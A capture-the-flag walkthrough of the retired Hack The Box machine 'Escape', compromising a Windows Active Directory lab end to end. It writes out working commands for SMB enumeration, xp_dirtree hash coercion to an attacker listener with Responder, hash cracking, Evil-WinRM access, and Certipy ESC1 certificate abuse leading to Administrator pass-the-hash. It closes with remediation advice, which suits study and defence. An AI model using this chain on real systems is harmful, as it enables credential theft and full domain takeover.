# Escape — Hack The Box

<p align="left">
  <img src="./assets/escape/00-card.png" alt="Escape HTB machine card" width="650">
</p>

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Medium |
| **OS** | Windows (Active Directory) |
| **Status** | ✅ Retired |
| **Key techniques** | Guest SMB access, MSSQL hash capture (`xp_dirtree` + Responder), log-file credential leak, AD CS ESC1 abuse |

---

## TL;DR

Escape is a Windows AD box on the `sequel.htb` domain. A guest-readable
SMB share hands out a PDF with a temporary MSSQL account. From MSSQL I
force the service to authenticate to my box and capture the `sql_svc`
NTLMv2 hash, crack it, and get a WinRM shell. A leftover `ERRORLOG.BAK`
leaks `ryan.cooper`'s password, and Ryan can enroll against a certificate
template vulnerable to **ESC1** — which I abuse to mint an Administrator
certificate and pull the Administrator hash.

---

## Recon

```bash
sudo nmap -sCV -p- 10.129.228.253
```

![nmap scan part 1](./assets/escape/01-nmap-1.png)
![nmap scan part 2](./assets/escape/02-nmap-2.png)

The open ports are a textbook domain controller: DNS (53), Kerberos (88),
RPC (135), LDAP/LDAPS (389/636), SMB (445), kpasswd (464), MSSQL (1433)
and WinRM (5985). MSSQL on a DC is the interesting one.

---

## SMB

Enumerated shares anonymously and found a non-default `Public` share:

```bash
smbclient -L //10.129.228.253
```

![anonymous SMB share listing](./assets/escape/03-smb-public-share.png)

The share held a PDF of SQL server procedures — downloaded it:

```bash
smbclient //10.129.228.253/Public
ls
get "SQL Server Procedures.pdf"
```

![downloading the PDF from the Public share](./assets/escape/04-download-pdf.png)

The PDF documents a temporary MSSQL login left in place for testing:
`PublicUser:GuestUserCantWrite1`.

![credentials found inside the PDF](./assets/escape/05-pdf-credentials.png)

---

## Foothold

Added the host to `/etc/hosts` so Kerberos/LDAP names resolve:

![adding sequel.htb to /etc/hosts](./assets/escape/06-etc-hosts.png)

Connected to MSSQL with the recovered account using Impacket:

```bash
impacket-mssqlclient sequel/PublicUser@10.129.228.253
```

The account has no write access, so instead of running commands I forced
the MSSQL service to authenticate to my machine and captured its hash — a
classic MSSQL technique:

![preparing the MSSQL hash capture](./assets/escape/07-mssql-hashcapture-info.png)

Started Responder, then triggered an outbound SMB auth from MSSQL with
`xp_dirtree`:

```bash
sudo responder -I tun0
EXEC xp_dirtree '\\10.10.15.54\kali'
```

![triggering xp_dirtree against my SMB listener](./assets/escape/08-xp-dirtree.png)

Responder caught the `sql_svc` NTLMv2 hash:

![Responder capturing the sql_svc NTLMv2 hash](./assets/escape/09-responder-hash.png)

Cracked it with hashcat:

```bash
hashcat -m 5600 sql_svc_hash.txt /usr/share/wordlists/rockyou.txt
```

![cracking the sql_svc hash](./assets/escape/10-hashcat-sqlsvc.png)

Password: `REGGIE1234ronnie`. Checked WinRM access with the new creds:

```bash
netexec winrm 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
```

![netexec confirming WinRM access for sql_svc](./assets/escape/11-netexec-sqlsvc.png)

`(Pwn3d!)`, so logged in with Evil-WinRM:

```bash
evil-winrm -i 10.129.228.253 -u sql_svc -p REGGIE1234ronnie
```

![Evil-WinRM shell as sql_svc](./assets/escape/12-evilwinrm-sqlsvc.png)

---

## Lateral Movement

In `C:\SQLServer\Logs` there was an `ERRORLOG.BAK`. Reading it revealed a
failed-login line where `ryan.cooper` had typed his password into the
username field:

![ERRORLOG.BAK leaking ryan.cooper's password](./assets/escape/13-errorlog.png)

![ryan.cooper credentials confirmed](./assets/escape/14-ryan-creds.png)

Credentials: `ryan.cooper:NuclearMosquito3`. Validated them over WinRM:

```bash
netexec winrm 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```

![netexec confirming WinRM for ryan.cooper](./assets/escape/15-netexec-ryan.png)

Logged in with Evil-WinRM and grabbed the user flag from Ryan's desktop:

```bash
evil-winrm -i 10.129.228.253 -u Ryan.Cooper -p NuclearMosquito3
```

![user flag as ryan.cooper](./assets/escape/16-user-flag.png)

---

## Privilege Escalation

### AD CS enumeration

Ryan is a member of `BUILTIN\Certificate Service DCOM Access` — a hint
that Active Directory Certificate Services is in play. Enumerated AD CS
with Certipy:

```bash
certipy-ad find -u Ryan.Cooper@sequel.htb -p 'NuclearMosquito3' -dc-ip 10.129.228.253
```

![certipy-ad find enumerating AD CS](./assets/escape/17-certipy-find.png)

![checking the exported certificate templates](./assets/escape/18-check-templates.png)

One template was flagged vulnerable to **ESC1** — enrollees can supply an
arbitrary `subjectAltName`, so a low-privileged user can request a
certificate *as* any account, including Domain Admin:

![template vulnerable to ESC1](./assets/escape/19-esc1-template.png)

### ESC1 abuse

Requested a certificate for the Administrator account through the
vulnerable template:

```bash
certipy-ad req -u 'Ryan.Cooper@sequel.htb' -p 'NuclearMosquito3' \
  -dc-ip 10.129.228.253 -target dc.sequel.htb -ca sequel-DC-CA \
  -template UserAuthentication -upn administrator@sequel.htb
```

![requesting an Administrator certificate](./assets/escape/20-request-cert.png)

Authentication needs the clock in sync with the DC, so synced time first,
then authenticated with the PFX to get the Administrator NT hash:

```bash
sudo ntpdate 10.129.228.253
certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.228.253
```

![certipy authenticating with the certificate for the Administrator hash](./assets/escape/21-certipy-auth.png)

### Shell as Administrator

Passed the hash to Evil-WinRM for an Administrator shell:

```bash
evil-winrm -i 10.129.228.253 -u Administrator -H <redacted-nt-hash>
```

![Administrator shell](./assets/escape/22-admin-shell.png)

Read the root flag from `C:\Users\Administrator\Desktop\root.txt`:

![root flag](./assets/escape/23-root-flag.png)

---

## Lessons Learned

- Anonymous/guest SMB access is worth checking on every AD box — a single
  readable share leaked the whole foothold here.
- When a SQL account can't run commands, it can often still be *coerced*:
  `xp_dirtree` against Responder turns "no write access" into a
  crackable service hash.
- Log and backup files (`ERRORLOG.BAK`) frequently capture credentials
  users fat-fingered into the wrong field — always read them.
- AD CS is a domain-compromise surface in its own right; ESC1 alone takes
  a normal user straight to Domain Admin.

---

## Remediation

- Remove sensitive documents (and embedded credentials) from
  guest-readable shares; disable anonymous SMB enumeration.
- Run MSSQL under a low-privileged, non-domain service account and block
  outbound SMB so hash capture isn't possible.
- Scrub credentials from log/backup files and restrict who can read them.
- Fix ESC1: remove `ENROLLEE_SUPPLIES_SUBJECT` from templates that allow
  client authentication, and tighten enrollment rights and CA manager
  approval.

---

## Tools used

- `nmap`
- `smbclient`
- Impacket (`mssqlclient.py`)
- `responder`
- `hashcat`
- `netexec`, `evil-winrm`
- `certipy-ad`

---

**See also:** [Active Directory methodology](../../methodology/active-directory.md)

---

**Machine:** [Hack The Box — Escape](https://www.hackthebox.com/machines/escape)
